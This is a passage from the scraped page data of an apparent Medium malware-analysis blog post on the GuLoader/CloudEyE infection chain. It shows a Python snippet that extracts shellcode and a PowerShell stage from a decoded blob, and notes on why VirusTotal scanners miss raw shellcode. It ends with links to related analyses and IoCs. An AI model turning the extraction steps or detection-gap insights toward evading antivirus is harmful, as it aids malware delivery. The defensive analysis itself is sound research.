open(\"veristfil.bin\", \"wb\") as file2:\n    file2.write(veristfil)\n\n# Get ASCII string\nFald2 = Hamart.decode('latin-1')\n\n# Extract \"19271 Byte Payload\" starting at Byte 193539\nRawnessa = Fald2[193539:193539+19271]\n\n# Print the extracted payload\nprint(Rawnessa)\n\n# Save Rawnessa to a file\nwith open(\"Rawnessa.bin\", \"wb\") as file3:\n    file3.write(Rawnessa.encode('latin-1'))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"python"},"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_51":{"__typename":"Paragraph","id":"6dcf52d1a5ec_51","name":"5d50","type":"P","href":null,"layout":null,"metadata":null,"text":"Note that this code also stores the stage 3 PowerShell code to “Rawnessa.bin”.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_52":{"__typename":"Paragraph","id":"6dcf52d1a5ec_52","name":"6d68","type":"P","href":null,"layout":null,"metadata":null,"text":"At this point, we now have successfully received and extracted the GuLoader Shellcode. As noted previously, the extracted shellcode stored in Industri3.bin is the decryptor, which would be executed with the shellcode stored as “veristfil.bin” as a parameter. The “Industri3.bin” would then decrypt the shellcode in“veristfil.bin” and execute its entry point.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_53":{"__typename":"Paragraph","id":"6dcf52d1a5ec_53","name":"b41a","type":"P","href":null,"layout":null,"metadata":null,"text":"An excellent analysis of this shellcode and its behavior can be found here https:\u002F\u002Fresearch.openanalysis.net\u002Fguloader\u002Funicorn\u002Femulation\u002Fanti-debug\u002Fdebugging\u002Fconfig\u002F2022\u002F12\u002F16\u002Fguloader.html#Guloader-Shellcode-Stage-1","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":75,"end":215,"href":"https:\u002F\u002Fresearch.openanalysis.net\u002Fguloader\u002Funicorn\u002Femulation\u002Fanti-debug\u002Fdebugging\u002Fconfig\u002F2022\u002F12\u002F16\u002Fguloader.html#Guloader-Shellcode-Stage-1","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_54":{"__typename":"Paragraph","id":"6dcf52d1a5ec_54","name":"5c07","type":"P","href":null,"layout":null,"metadata":null,"text":"As previously noted, I won’t go further into it.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_55":{"__typename":"Paragraph","id":"6dcf52d1a5ec_55","name":"ab3a","type":"H4","href":null,"layout":null,"metadata":null,"text":"Additional findings (part 1)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_56":{"__typename":"Paragraph","id":"6dcf52d1a5ec_56","name":"1380","type":"P","href":null,"layout":null,"metadata":null,"text":"After doing this analysis, I uploaded both shell codes to VirusTotal. They both had a 0\u002F59 detection rate. This sparked a discussion on the detection of in-memory shellcode in the OAnalysis Discord server. It was pointed out that many antivirus software programs wouldn’t analyze shellcode when uploaded to VT as it would not be recognized as working code. I decided to append two screenshots of this conversation with permission of all involved entities below. I think they contain valuable insights and are worth a read:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*6gaLUlpx2ZHudM7vFQxQ2g.png":{"__typename":"ImageMetadata","id":"1*6gaLUlpx2ZHudM7vFQxQ2g.png","originalHeight":1246,"originalWidth":2633,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_57":{"__typename":"Paragraph","id":"6dcf52d1a5ec_57","name":"9c25","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*6gaLUlpx2ZHudM7vFQxQ2g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*pPlcH2TkZJWTKa9Lnp1S3w.png":{"__typename":"ImageMetadata","id":"1*pPlcH2TkZJWTKa9Lnp1S3w.png","originalHeight":1615,"originalWidth":2637,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6dcf52d1a5ec_58":{"__typename":"Paragraph","id":"6dcf52d1a5ec_58","name":"a0e4","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*pPlcH2TkZJWTKa9Lnp1S3w.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_59":{"__typename":"Paragraph","id":"6dcf52d1a5ec_59","name":"a746","type":"P","href":null,"layout":null,"metadata":null,"text":"Tl;dr:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_60":{"__typename":"Paragraph","id":"6dcf52d1a5ec_60","name":"6709","type":"OLI","href":null,"layout":null,"metadata":null,"text":"You can not expect random shell codes without context to be detected by VT.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_61":{"__typename":"Paragraph","id":"6dcf52d1a5ec_61","name":"f483","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Performance plays a big role in AntiVirus creation, therefor running signatures on unknown file types that are not able to execute on their own is reduced.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_62":{"__typename":"Paragraph","id":"6dcf52d1a5ec_62","name":"0557","type":"OLI","href":null,"layout":null,"metadata":null,"text":"Scans can be file-type based to increase performance, which means only certain areas of a binary are scanned at all.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_63":{"__typename":"Paragraph","id":"6dcf52d1a5ec_63","name":"5f10","type":"P","href":null,"layout":null,"metadata":null,"text":"4. Uploading a shellcode as part of a PE might trigger detections that are not triggered when solely uploading the shellcode.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_64":{"__typename":"Paragraph","id":"6dcf52d1a5ec_64","name":"3f01","type":"P","href":null,"layout":null,"metadata":null,"text":"I think those are important things to note when interpreting VirusTotal detection results.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_65":{"__typename":"Paragraph","id":"6dcf52d1a5ec_65","name":"b5c7","type":"P","href":null,"layout":null,"metadata":null,"text":"Make sure to check out the involved people here: struppigel, herrcore, Lasq.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":49,"end":59,"href":"https:\u002F\u002Ftwitter.com\u002Fstruppigel","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":60,"end":69,"href":"https:\u002F\u002Ftwitter.com\u002Fherrcore","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":71,"end":75,"href":"https:\u002F\u002Ftwitter.com\u002Flasq88","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_66":{"__typename":"Paragraph","id":"6dcf52d1a5ec_66","name":"6749","type":"H4","href":null,"layout":null,"metadata":null,"text":"Additional Findings (part 2)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_67":{"__typename":"Paragraph","id":"6dcf52d1a5ec_67","name":"7a69","type":"P","href":null,"layout":null,"metadata":null,"text":"When writing this blogpost I actually discovered that this sample was initially discussed by Brad Duncan in a SANS diary. From his analysis, I was also able to recover the full infection chain as presented in Figure 1, and identify the final payload of this infection which was Remcos Rat.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":93,"end":104,"href":"https:\u002F\u002Ftwitter.com\u002Fmalware_traffic","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_68":{"__typename":"Paragraph","id":"6dcf52d1a5ec_68","name":"2c8b","type":"P","href":null,"layout":null,"metadata":null,"text":"Make sure to check out his work here: https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002F29990","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":38,"end":70,"href":"https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002F29990","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_69":{"__typename":"Paragraph","id":"6dcf52d1a5ec_69","name":"9713","type":"H4","href":null,"layout":null,"metadata":null,"text":"Addition Reading for interested minds:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_70":{"__typename":"Paragraph","id":"6dcf52d1a5ec_70","name":"23b6","type":"P","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FGuLoader+or+DBatLoaderModiLoaderstyle+infection+for+Remcos+RAT\u002F29990","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":95,"href":"https:\u002F\u002Fisc.sans.edu\u002Fdiary\u002FGuLoader+or+DBatLoaderModiLoaderstyle+infection+for+Remcos+RAT\u002F29990","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_71":{"__typename":"Paragraph","id":"6dcf52d1a5ec_71","name":"0f1f","type":"P","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fwww.esentire.com\u002Fblog\u002Fguloader-vbscript-variant-returns-with-powershell-updates","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":87,"href":"https:\u002F\u002Fwww.esentire.com\u002Fblog\u002Fguloader-vbscript-variant-returns-with-powershell-updates","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_72":{"__typename":"Paragraph","id":"6dcf52d1a5ec_72","name":"7a25","type":"P","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fresearch.openanalysis.net\u002Fguloader\u002Funicorn\u002Femulation\u002Fanti-debug\u002Fdebugging\u002Fconfig\u002F2022\u002F12\u002F16\u002Fguloader.html","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":113,"href":"https:\u002F\u002Fresearch.openanalysis.net\u002Fguloader\u002Funicorn\u002Femulation\u002Fanti-debug\u002Fdebugging\u002Fconfig\u002F2022\u002F12\u002F16\u002Fguloader.html","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_73":{"__typename":"Paragraph","id":"6dcf52d1a5ec_73","name":"d405","type":"H3","href":null,"layout":null,"metadata":null,"text":"IoC:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_74":{"__typename":"Paragraph","id":"6dcf52d1a5ec_74","name":"cfc4","type":"P","href":null,"layout":null,"metadata":null,"text":"All IoC for this campaign can be found here: https:\u002F\u002Fgithub.com\u002FGi7w0rm\u002FMalwareConfigLists\u002Fblob\u002Fmain\u002FGuLoader\u002FGuLoader_From_lnk_to_Shellcode.txt","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":45,"end":144,"href":"https:\u002F\u002Fgithub.com\u002FGi7w0rm\u002FMalwareConfigLists\u002Fblob\u002Fmain\u002FGuLoader\u002FGuLoader_From_lnk_to_Shellcode.txt","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6dcf52d1a5ec_75":{"__typename":"Paragraph","id":"6dcf52d1a5ec_75","name":"c0da","type":"P","href":null,"layout":null,"metadata":null,"text":"If you made it here, thank you for reading this. It means a lot to me.\nMake sure to follow my socials if you want more cybersecurity content or support my work via Kofi. Until the next one. \nCheers ❤","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":94,"end":101,"href":"https:\u002F\u002Ftwitter.com\u002FGi7w0rm","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":164,"end":168,"href":"https:\u002F\u002Fko-fi.com\u002Fgi7w0rm","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"PostViewerEdge:postId:4b5f1d6d877-viewerId:lo_79be97193dad":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:4b5f1d6d877-viewerId:lo_79be97193dad"},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Tag:guloader":{"__typename":"Tag","id":"guloader","displayTitle":"Guloader","normalizedTagSlug":"guloader"},"Tag:reverse-engineering":{"__typename":"Tag","id":"reverse-engineering","displayTitle":"Reverse Engineering","normalizedTagSlug":"reverse-engineering"},"Tag:cyber-threat-intelligence":{"__typename":"Tag","id":"cyber-threat-intelligence","displayTitle":"Cyber Threat Intelligence","normalizedTagSlug":"cyber-threat-intelligence"},"Tag:malware":{"__typename":"Tag","id":"malware","displayTitle":"Malware","normalizedTagSlug":"malware"},"Post:4b5f1d6d877":{"__typename":"Post","id":"4b5f1d6d877","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"c395","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"1326","startIndex":5,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"d26b","startIndex":28,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"d673","startIndex":40,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"6a22","startIndex":55,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"84cb","startIndex":69,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null},{"__typename":"Section","name":"80fa","startIndex":73,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:6dcf52d1a5ec_0"},{"__ref":"Paragraph:6dcf52d1a5ec_1"},{"__ref":"Paragraph:6dcf52d1a5ec_2"},{"__ref":"Paragraph:6dcf52d1a5ec_3"},{"__ref":"Paragraph:6dcf52d1a5ec_4"},{"__ref":"Paragraph:6dcf52d1a5ec_5"},{"__ref":"Paragraph:6dcf52d1a5ec_6"},{"__ref":"Paragraph:6dcf52d1a5ec_7"},{"__ref":"Paragraph:6dcf52d1a5ec_8"},{"__ref":"Paragraph:6dcf52d1a5ec_9"},{"__ref":"Paragraph:6dcf52d1a5ec_10"},{"__ref":"Paragraph:6dcf52d1a5ec_11"},{"__ref":"Paragraph:6dcf52d1a5ec_12"},{"__ref":"Paragraph:6dcf52d1a5ec_13"},{"__ref":"Paragraph:6dcf52d1a5ec_14"},{"__ref":"Paragraph:6dcf52d1a5ec_15"},{"__ref":"Paragraph:6dcf52d1a5ec_16"},{"__ref":"Paragraph:6dcf52d1a5ec_17"},{"__ref":"Paragraph:6dcf52d1a5ec_18"},{"__ref":"Paragraph:6dcf52d1a5ec_19"},{"__ref":"Paragraph:6dcf52d1a5ec_20"},{"__ref":"Paragraph:6dcf52d1a5ec_21"},{"__ref":"Paragraph:6dcf52d1a5ec_22"},{"__ref":"Paragraph:6dcf52d1a5ec_23"},{"__ref":"Paragraph:6dcf52d1a5ec_24"},{"__ref":"Paragraph:6dcf52d1a5ec_25"},{"__ref":"Paragraph:6dcf52d1a5ec_26"},{"__ref":"Paragraph:6dcf52d1a5ec_27"},{"__ref":"Paragraph:6dcf52d1a5ec_28"},{"__ref":"Paragraph:6dcf52d1a5ec_29"},{"__ref":"Paragraph:6dcf52d1a5ec_30"},{"__ref":"Paragraph:6dcf52d1a5ec_31"},{"__ref":"Paragraph:6dcf52d1a5ec_32"},{"__ref":"Paragraph:6dcf52d1a5ec_33"},{"__ref":"Paragraph:6dcf52d1a5ec_34"},{"__ref":"Paragraph:6dcf52d1a5ec_35"},{"__ref":"Paragraph:6dcf52d1a5ec_36"},{"__ref":"Paragraph:6dcf52d1a5ec_37"},{"__ref":"Paragraph:6dcf52d1a5ec_38"},{"__ref":"Paragraph:6dcf52d1a5ec_39"},{"__ref":"Paragraph:6dcf52d1a5ec_40"},{"__ref":"Paragraph:6dcf52d1a5ec_41"},{"__ref":"Paragraph:6dcf52d1a5ec_42"},{"__ref":"Paragraph:6dcf52d1a5ec_43"},{"__ref":"Paragraph:6dcf52d1a5ec_44"},{"__ref":"Paragraph:6dcf52d1a5ec_45"},{"__ref":"Paragraph:6dcf52d1a5ec_46"},{"__ref":"Paragraph:6dcf52d1a5ec_47"},{"__ref":"Paragraph:6dcf52d1a5ec_48"},{"__ref":"Paragraph:6dcf52d1a5ec_49"},{"__ref":"Paragraph:6dcf52d1a5ec_50"},{"__ref":"Paragraph:6dcf52d1a5ec_51"},{"__ref":"Paragraph:6dcf52d1a5ec_52"},{"__ref":"Paragraph:6dcf52d1a5ec_53"},{"__ref":"Paragraph:6dcf52d1a5ec_54"},{"__ref":"Paragraph:6dcf52d1a5ec_55"},{"__ref":"Paragraph:6dcf52d1a5ec_56"},{"__ref":"Paragraph:6dcf52d1a5ec_57"},{"__ref":"Paragraph:6dcf52d1a5ec_58"},{"__ref":"Paragraph:6dcf52d1a5ec_59"},{"__ref":"Paragraph:6dcf52d1a5ec_60"},{"__ref":"Paragraph:6dcf52d1a5ec_61"},{"__ref":"Paragraph:6dcf52d1a5ec_62"},{"__ref":"Paragraph:6dcf52d1a5ec_63"},{"__ref":"Paragraph:6dcf52d1a5ec_64"},{"__ref":"Paragraph:6dcf52d1a5ec_65"},{"__ref":"Paragraph:6dcf52d1a5ec_66"},{"__ref":"Paragraph:6dcf52d1a5ec_67"},{"__ref":"Paragraph:6dcf52d1a5ec_68"},{"__ref":"Paragraph:6dcf52d1a5ec_69"},{"__ref":"Paragraph:6dcf52d1a5ec_70"},{"__ref":"Paragraph:6dcf52d1a5ec_71"},{"__ref":"Paragraph:6dcf52d1a5ec_72"},{"__ref":"Paragraph:6dcf52d1a5ec_73"},{"__ref":"Paragraph:6dcf52d1a5ec_74"},{"__ref":"Paragraph:6dcf52d1a5ec_75"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:fa7639fc99f0"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fgi7w0rm.medium.com\u002Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"6dcf52d1a5ec","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":1},"clapCount":82,"allowResponses":true,"isLimitedState":false,"title":"CloudEyE — From .lnk to Shellcode","isSeries":false,"sequence":null,"uniqueSlug":"cloudeye-from-lnk-to-shellcode-4b5f1d6d877","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1688866457028,"readingTime":11.462264150943398,"previewContent":{"__typename":"PreviewContent","subtitle":"Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye…"},"previewImage":{"__ref":"ImageMetadata:1*iZAFaE20Ffz3o6zT65W6DQ.png"},"isShortform":false,"seoTitle":"","firstPublishedAt":1688864236487,"updatedAt":1689242168558,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:4b5f1d6d877-viewerId:lo_79be97193dad"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:cybersecurity"},{"__ref":"Tag:guloader"},{"__ref":"Tag:reverse-engineering"},{"__ref":"Tag:cyber-threat-intelligence"},{"__ref":"Tag:malware"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":2693,"layerCake":6}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.24f082fe.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.e66fdbd5.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1386.90da86c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.5b3eb23a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/719.0e220795.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6349.b071a958.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1443.a8a73f48.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3735.afb7e926.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.cee3e6b2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.cd03f950.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.08de95de.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/1781.db373833.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2420.2a5e2d95.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.ca7937c2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.d195c6f1.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.21ff89d3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.e27cfbf2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2961.00a48598.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/230.ec2ef161.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.6aeac6a8.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8dd769a8abe86d5a',t:'MTczMDc1Mjc1OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8dd769a8abe86d5a","version":"2024.10.4","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>